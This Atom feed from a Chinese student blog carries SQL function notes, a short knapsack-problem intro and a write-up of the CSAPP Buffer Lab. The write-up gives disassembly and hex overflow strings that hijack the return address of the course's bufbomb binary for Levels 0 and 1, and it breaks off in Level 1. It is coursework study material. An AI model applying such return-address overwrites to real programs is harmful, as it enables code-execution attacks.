<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>只为不凡而来</title>
  <subtitle>小智的世界</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-13T16:44:21.791Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>wuduozhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据库|在2018毕业生彩蛋中学到的</title>
    <link href="http://yoursite.com/2018/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%9C%A82018%E6%AF%95%E4%B8%9A%E7%94%9F%E5%BD%A9%E8%9B%8B%E4%B8%AD%E5%AD%A6%E5%88%B0%E7%9A%84/"/>
    <id>http://yoursite.com/2018/05/13/数据库-在2018毕业生彩蛋中学到的/</id>
    <published>2018-05-13T12:50:36.000Z</published>
    <updated>2018-05-13T16:44:21.791Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h3><p>SQL SELECT DISTINCT 语句</p>
<p>在表中，可能会包含重复值。这并不成问题，不过，有时您也许希望仅仅列出不同（distinct）的值。</p>
<p>关键词 <code>DISTINCT</code> 用于返回唯一不同的值。</p>
<p>语法：<code>SELECT DISTINCT 列名称 FROM 表名称</code></p>
<h3 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h3><p><code>GROUP BY</code>语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
<p>SQL GROUP BY 语法 :<code>SELECT column_name, aggregate_function(column_name) FROM table_name  WHERE column_name operator value
GROUP BY column_name;</code> </p>
<h4 id="用法详解"><a href="#用法详解" class="headerlink" title="用法详解"></a>用法详解</h4><p>原始表：</p>
<p><img src="/images/数据库-04.jpg" alt="原始数据"></p>
<h5 id="简单Group-By"><a href="#简单Group-By" class="headerlink" title="简单Group By"></a>简单Group By</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select 类别, sum(数量) as 数量之和</div><div class="line">from A</div><div class="line">group by 类别</div></pre></td></tr></table></figure>
<p>返回结果如下表，实际上就是分类汇总。</p>
<p><img src="/images/数据库-05.jpg" alt="Group by"></p>
<h5 id="Group-By中Select指定的字段限制"><a href="#Group-By中Select指定的字段限制" class="headerlink" title="Group By中Select指定的字段限制"></a>Group By中Select指定的字段限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">select 类别, sum(数量) as 数量之和, 摘要</div><div class="line">from A</div><div class="line">group by 类别</div><div class="line">order by 类别 desc</div></pre></td></tr></table></figure>
<p>这个sql语句是错误的，原因是<strong>在select指定的字段要么就要包含在Group By语句的后面，作为分组的依据；要么就要被包含在聚合函数中。</strong></p>
<h5 id="GROUP-BY-多列分组的使用"><a href="#GROUP-BY-多列分组的使用" class="headerlink" title="GROUP BY 多列分组的使用"></a>GROUP BY 多列分组的使用</h5><p>“多列分组”实际上就是就是按照多列（字段1+字段2）合并后的值进行分组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select 类别, 摘要, sum(数量) as 数量之和</div><div class="line">from A</div><div class="line">group by  类别, 摘要</div></pre></td></tr></table></figure>
<p><img src="/images/数据库-06.jpg" alt="Group by"></p>
<p>“多列分组”实际上就是就是按照多列（类别+摘要）合并后的值进行分组，示例4中可以看到“a, a2001, 13”为“a, a2001, 11”和“a, a2001, 2”两条记录的合并。</p>
<h5 id="Group-By与聚合函数"><a href="#Group-By与聚合函数" class="headerlink" title="Group By与聚合函数"></a>Group By与聚合函数</h5><p>在示例3中提到group by语句中select指定的字段必须是“分组依据字段”，其他字段若想出现在select中则必须包含在聚合函数中，常见的聚合函数如下表：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>作用</th>
<th>支持性</th>
</tr>
</thead>
<tbody>
<tr>
<td>sum(列名)</td>
<td>求和    　　　</td>
<td>　</td>
</tr>
<tr>
<td>max(列名)</td>
<td>最大值    　</td>
<td>　　　</td>
</tr>
<tr>
<td>min(列名)</td>
<td>最小值    　</td>
<td>　　　</td>
</tr>
<tr>
<td>avg(列名)</td>
<td>平均值    　　</td>
<td>　　</td>
</tr>
<tr>
<td>first(列名)</td>
<td>第一条记录</td>
<td>仅Access支持</td>
</tr>
<tr>
<td>last(列名)</td>
<td>最后一条记录</td>
<td>仅Access支持</td>
</tr>
<tr>
<td>count(列名)</td>
<td>统计记录数</td>
<td>注意和count(*)的区别</td>
</tr>
</tbody>
</table>
<p>例如：</p>
<ul>
<li>求各组平均值:<code>select 类别, avg(数量) AS 平均值 from A group by 类别;</code></li>
<li>求各组记录数目:<code>select 类别, count(*) AS 记录数 from A group by 类别;</code></li>
</ul>
<h5 id="Having与Where的区别"><a href="#Having与Where的区别" class="headerlink" title="Having与Where的区别"></a>Having与Where的区别</h5><ul>
<li>where 子句的作用是在对查询结果进行分组前，将不符合where条件的行去掉，即在分组之前过滤数据，where条件中不能包含聚组函数，使用where条件过滤出特定的行。</li>
<li>having 子句的作用是筛选满足条件的组，即在分组之后过滤数据，条件中经常包含聚组函数，使用having 条件过滤出特定的组，也可以使用多个分组标准进行分组。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select 类别, sum(数量) as 数量之和 from A</div><div class="line">group by 类别</div><div class="line">having sum(数量) &gt; 18</div></pre></td></tr></table></figure>
<p>Having和Where的联合使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">select 类别, SUM(数量)from A</div><div class="line">where 数量 &gt; 8</div><div class="line">group by 类别</div><div class="line">having SUM(数量) &gt; 10</div></pre></td></tr></table></figure></p>
<h3 id="nvl函数"><a href="#nvl函数" class="headerlink" title="nvl函数"></a>nvl函数</h3><p>NVL(E1, E2)的功能为：如果E1为NULL，则函数返回E2，否则返回E1本身。</p>
<h3 id="CUME-DIST-函数"><a href="#CUME-DIST-函数" class="headerlink" title="CUME_DIST 函数"></a>CUME_DIST 函数</h3><p>计算某个窗口或分区中某个值的累积分布。假定升序排序，则使用以下公式确定累积分布：<code>count of rows with values &lt;= x / count of rows in the window or partition</code></p>
<p>其中，x 等于 ORDER BY 子句中指定的列的当前行中的值。以下数据集说明了此公式的使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Row#	Value	  Calculation    CUME_DIST</div><div class="line">1        2500	   (1)/(5)	       0.2</div><div class="line">2        2600	   (2)/(5)	   	   0.4</div><div class="line">3        2800	   (3)/(5)	   	   0.6</div><div class="line">4        2900	   (4)/(5)	   	   0.8</div><div class="line">5        3100	   (5)/(5)	       1.0</div></pre></td></tr></table></figure>
<p>返回值范围介于 0 和 1（含 1）之间。</p>
<p>语法：</p>
<pre><code>CUME_DIST ()
OVER ( 
[ PARTITION BY partition_expression ] 
[ ORDER BY order_list ]
)
</code></pre><p>参数：</p>
<pre><code>* OVER：一个指定窗口分区的子句。OVER 子句不能包含窗口框架规范。

* PARTITION BY partition_expression：可选。一个设置 OVER 子句中每个组的记录范围的表达式。

 * ORDER BY order_list：用于计算累积分布的表达式。该表达式必须具有数字数据类型或可隐式转换为 1。如果省略 ORDER BY，则所有行的返回值为 1。
</code></pre><p>如果 ORDER BY 未生成唯一顺序，则行的顺序是不确定的。</p>
<p>返回类型：FLOAT8</p>
<p>效果展示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">select * from user;</div><div class="line"> OK</div><div class="line">user.dept    user.userid    user.sal</div><div class="line">d1    user1    1000</div><div class="line">d1    user2    2000</div><div class="line">d1    user3    3000</div><div class="line">d2    user4    4000</div><div class="line">d2    user5    5000</div></pre></td></tr></table></figure>
<p>比如，统计小于等于当前薪水的人数，所占总人数的比例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">select dept,userid,sal,</div><div class="line">cume_dist() over(order by sal) as rn1,</div><div class="line">cume_dist() over(partition by dept order by sal) as rn2</div><div class="line">from user;</div><div class="line"></div><div class="line">OK</div><div class="line">dept    userid    sal    rn1    rn2</div><div class="line">d1    user1    1000    0.2    0.3333333333333333</div><div class="line">d1    user2    2000    0.4    0.6666666666666666</div><div class="line">d1    user3    3000    0.6    1.0</div><div class="line">d2    user4    4000    0.8    0.5</div><div class="line">d2    user5    5000    1.0    1.0</div></pre></td></tr></table></figure></p>
<p>解释：</p>
<ul>
<li>rn1: 没有partition,所有数据均为1组，总行数为5，<ul>
<li>第一行：小于等于1000的行数为1，因此，1/5=0.2</li>
<li>第三行：小于等于3000的行数为3，因此，3/5=0.6</li>
</ul>
</li>
<li>rn2: 按照部门分组，dpet=d1的行数为3,<br>  -第二行：小于等于2000的行数为2，因此，2/3=0.6666666666666666</li>
</ul>
<h3 id="rank函数"><a href="#rank函数" class="headerlink" title="rank函数"></a>rank函数</h3><p>rank函数是排名函数。rank函数最常用的是求某一个数值在某一区域内的排名。</p>
<ul>
<li>语法：<code>RANK() OVER([&lt;partition_by_clause&gt;]&lt;order by clause&gt;)</code></li>
<li>参数<ul>
<li>partition_by_clause 将from子句生成的结果集划分为应用到RANK函数的分区。</li>
<li>Order_by_clause确定将RANK值应用到分区中的行时所使用的顺序。</li>
</ul>
</li>
</ul>
<h3 id="round函数"><a href="#round函数" class="headerlink" title="round函数"></a>round函数</h3><p>Round函数返回一个数值，该数值是按照指定的小数位数进行四舍五入运算的结果。可是当保留位跟着的即使是5，有可能进位，也有可能舍去，机会各50%。这样就会造成在应用程序中计算有误。</p>
<ul>
<li>语法:<code>round(number,digits)</code> </li>
<li>参数<ul>
<li>number,要四舍五入的数，digits是要小数点后保留的位数。</li>
</ul>
</li>
<li>返回值 ：四舍五入后的值</li>
</ul>
<p>注： </p>
<ul>
<li>如果 digits 大于 0，则四舍五入到指定的小数位。 </li>
<li>如果 digits 等于 0，则四舍五入到最接近的整数。 </li>
<li>如果 digits 小于 0，则在小数点左侧进行四舍五入。</li>
<li>如果round函数只有参数number,等同于digits 等于 0。</li>
</ul>
<p>举例：</p>
<ul>
<li>round(3.1415926,2)=3.14;</li>
<li>round(3.1415926,3)=3.142;</li>
<li>select round(193,-2)from dual; 200</li>
<li>select round(193,-1)from dual;190</li>
<li>select round(193,-3)from dual;0</li>
</ul>
<h3 id="TO-CHAR-函数"><a href="#TO-CHAR-函数" class="headerlink" title="TO_CHAR() 函数"></a>TO_CHAR() 函数</h3><p>to_char()，计算机语言函数，指的是将数值型或者日期型转化为字符型。</p>
<table>
<thead>
<tr>
<th>例子</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>to_char(1210.73, ‘9999.9’)</td>
<td>would return ‘1210.7’</td>
</tr>
<tr>
<td>to_char(1210.73, ‘9,999.99’)</td>
<td>would return ‘1,210.73’</td>
</tr>
<tr>
<td>to_char(1210.73, ‘$9,999.00’)</td>
<td>would return ‘$1,210.73’</td>
</tr>
<tr>
<td>to_char(21, ‘000099’)</td>
<td>would return ‘000021’</td>
</tr>
</tbody>
</table>
<p>The following is a list of valid parameters when the to_char function is used to convert a date to a string. These parameters can be used in many combinations.</p>
<p><img src="/images/数据库-03.png" alt="to_char函数模板"></p>
<p>The following are date examples for the to_char function.</p>
<table>
<thead>
<tr>
<th>例子</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>to_char(sysdate, ‘yyyy/mm/dd’);</td>
<td>would return ‘2003/07/09’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘Month DD, YYYY’);</td>
<td>would return ‘July 09, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMonth DD, YYYY’);</td>
<td>would return ‘July 9, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘MON DDth, YYYY’);</td>
<td>would return ‘JUL 09TH, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMON DDth, YYYY’);</td>
<td>would return ‘JUL 9TH, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMon ddth, YYYY’);</td>
<td>would return ‘Jul 9th, 2003’</td>
</tr>
</tbody>
</table>
<p>You will notice that in some examples, the format_mask parameter begins with “FM”. This means that zeros and blanks are suppressed. This can be seen in the examples below.</p>
<table>
<thead>
<tr>
<th>例子</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>to_char(sysdate, ‘FMMonth DD, YYYY’);</td>
<td>would return ‘July 9, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMON DDth, YYYY’);</td>
<td>would return ‘JUL 9TH, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMon ddth, YYYY’);</td>
<td>would return ‘Jul 9th, 2003’</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;DISTINCT&quot;&gt;&lt;a href=&quot;#DISTINCT&quot; class=&quot;headerlink&quot; title=&quot;DISTINCT&quot;&gt;&lt;/a&gt;DISTINCT&lt;/h3&gt;&lt;p&gt;SQL SELECT DISTINCT 语句&lt;/p&gt;
&lt;p&gt;在表中，可能会包含重复值。这并不
    
    </summary>
    
      <category term="数据库" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="数据库" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>计算机算法|动态规划之0-1背包问题</title>
    <link href="http://yoursite.com/2018/05/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B9%8B0-1%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/05/13/计算机算法-动态规划之0-1背包问题/</id>
    <published>2018-05-12T17:26:51.000Z</published>
    <updated>2018-05-12T14:33:27.638Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-1背包问题"><a href="#0-1背包问题" class="headerlink" title="0-1背包问题"></a>0-1背包问题</h3><p>有N件物品和一个容量为V的背包。（每种物品均只有一件）第i件物品的费用是c[i]，价值是w[i]。求解将哪些物品装入背包可使价值总和最大。</p>
<p>通过阅读问题，因为背包就是要往里面放东西，所以一件物品就是有<strong>放或不放</strong>两种情况，那么怎么才能判断当前物品<strong>该不该放进去从而使利益最大化</strong>呢。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0-1背包问题&quot;&gt;&lt;a href=&quot;#0-1背包问题&quot; class=&quot;headerlink&quot; title=&quot;0-1背包问题&quot;&gt;&lt;/a&gt;0-1背包问题&lt;/h3&gt;&lt;p&gt;有N件物品和一个容量为V的背包。（每种物品均只有一件）第i件物品的费用是c[i]，价值是w[i]。求
    
    </summary>
    
      <category term="计算机算法" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="计算机算法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|CSAPP-Bufferlab</title>
    <link href="http://yoursite.com/2018/05/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-CSAPP-Bufferlab/"/>
    <id>http://yoursite.com/2018/05/12/深入理解计算机系统-CSAPP-Bufferlab/</id>
    <published>2018-05-11T20:29:36.000Z</published>
    <updated>2018-05-13T03:13:53.412Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用<code>缓冲区溢出漏洞</code>生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
<li>IA32的栈帧结构，可参考：<a href="http://wuduozhi.me/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-5/" target="_blank" rel="external">深入理解计算机系统|汇编的世界-5</a></li>
<li>gdb调试，可参考：<a href="http://wuduozhi.me/2018/03/27/%E5%B7%A5%E5%85%B7-gdb%E8%B0%83%E8%AF%95/" target="_blank" rel="external">工具|gdb调试</a></li>
</ul>
<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>实验讲义中主要包含了以下3个可执行文件：</p>
<ul>
<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
<li>makecookie 根据你所输入的userid生成一个cookie</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<p>值得注意的是，<code>bufbomb</code>接受如下的参数：</p>
<ul>
<li>-h 打印帮助信息</li>
<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
<li>-n 进入’Nitro’模式，在阶段4中使用</li>
<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
</ul>
<p>首先我们要输入userid生成一个cookie供后续使用，我这里使用uesrud为<code>xzz</code>。命令及结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie xzz &gt; cookie   </div><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie   </div><div class="line">0x52f8c747</div></pre></td></tr></table></figure>
<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令如下：<code>objdump -d bufbomb &gt; bufbomb.s</code> 。</p>
<p>目标程序的通过<code>getbuf</code>函数从标准输入流中读取字符串，该函数具有缓冲区溢出的漏洞，我们的实验都是通过这个函数的漏洞展开的。</p>
<p><code>getbuf</code>函数：</p>
<pre><code>/ * Buffer size for getbuf* /
#define NORMAL_BUFFER_SIZE 32

int getbuf()
{
    char buf[NORMAL_BUFFER_SIZE];
    Gets(buf);
    return 1;
}
</code></pre><p><code>getbuf</code>函数的反汇编格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure></p>
<p>注意到函数总共开辟了<code>0x38=56</code>个字节的栈空间，然后<code>lea -0x28(%ebp),%eax</code>和<code>mov %eax,(%esp)</code>进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而<code>ebp</code>指向栈底，我们可以推测缓冲区总共是0x28=40个字节。所以能得到<code>getbuf</code>函数的栈帧如下图：</p>
<p><img src="/images/CSAPP-BufferLab-01.png" alt="getbuf栈帧"></p>
<p>那么所谓的缓冲区溢出也就是破坏<code>buf</code>到返回地址的内存空间，把需要跳转的地址通过溢出填入到返回地址中，改变程序的执行顺序。</p>
<h3 id="开始攻关"><a href="#开始攻关" class="headerlink" title="开始攻关"></a>开始攻关</h3><h4 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0 Candle"></a>Level 0 Candle</h4><p>The function getbuf is called within BUFBOMB by a function test having the following C code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/* test */</div><div class="line">void test()</div><div class="line">&#123;</div><div class="line">    int val;</div><div class="line">    /* Put canary on stack to detect possible corruption */</div><div class="line">    volatile int local = uniqueval();</div><div class="line">    val = getbuf();</div><div class="line">    /* Check for corrupted stack */</div><div class="line">    if (local != uniqueval()) &#123;</div><div class="line">	    printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</div><div class="line">    &#125;else if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Boom!: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    	validate(3);</div><div class="line">    &#125; else &#123;</div><div class="line">    	printf(&quot;Dud: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void smoke()</div><div class="line">&#123;</div><div class="line">    printf(&quot;Smoke!: You called smoke()\n&quot;);</div><div class="line">    validate(0);</div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。通过反汇编得到smoke的汇编代码，可以得到smoke的起始地址<code>080490ba</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080490ba &lt;smoke&gt;:</div><div class="line"> 80490ba:	55                   	push   %ebp</div><div class="line"> 80490bb:	89 e5                	mov    %esp,%ebp</div><div class="line"> 80490bd:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 80490c0:	c7 04 24 b5 9f 04 08 	movl   $0x8049fb5,(%esp)</div><div class="line"> 80490c7:	e8 74 f8 ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 80490cc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490d3:	e8 0c 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 80490d8:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490df:	e8 ac f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
<p>根据以上的信息，我们的攻击代码 level0.txt 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 ba 90 04 08 /* 保存的%ebp以及返回地址 注意是小端机器*/</div></pre></td></tr></table></figure></p>
<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level0.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1 Sparkler"></a>Level 1 Sparkler</h4><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">void fizz(int val)</div><div class="line">&#123;</div><div class="line">    if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Fizz!: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    	validate(1);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    </div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0804906f &lt;fizz&gt;:</div><div class="line"> 804906f:	55                   	push   %ebp</div><div class="line"> 8049070:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049072:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049075:	8b 45 08             	mov    0x8(%ebp),%eax</div><div class="line"> 8049078:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 804907e:	75 1e                	jne    804909e &lt;fizz+0x2f&gt;</div><div class="line"> 8049080:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049084:	c7 04 24 97 9f 04 08 	movl   $0x8049f97,(%esp)</div><div class="line"> 804908b:	e8 50 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049090:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</div><div class="line"> 8049097:	e8 48 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 804909c:	eb 10                	jmp    80490ae &lt;fizz+0x3f&gt;</div><div class="line"> 804909e:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 80490a2:	c7 04 24 b8 a1 04 08 	movl   $0x804a1b8,(%esp)</div><div class="line"> 80490a9:	e8 32 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 80490ae:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490b5:	e8 d6 f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数<code>fizz</code>的起始地址为<code>0804906f</code>，<code>val</code>保存在<code>0x8(%ebp)</code>中，cookie保存在固定的地址<code>0x804c1e4</code>中。根据以上的信息，我们的攻击代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 6f 90 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 47 c7 f8 52 /* cookie */</div></pre></td></tr></table></figure>
<p>注意到，从<code>getbuf</code>返回的时候，内存是这样的一个状态：</p>
<p><img src="/images/CSAPP-BufferLab-02.png" alt="level-01"></p>
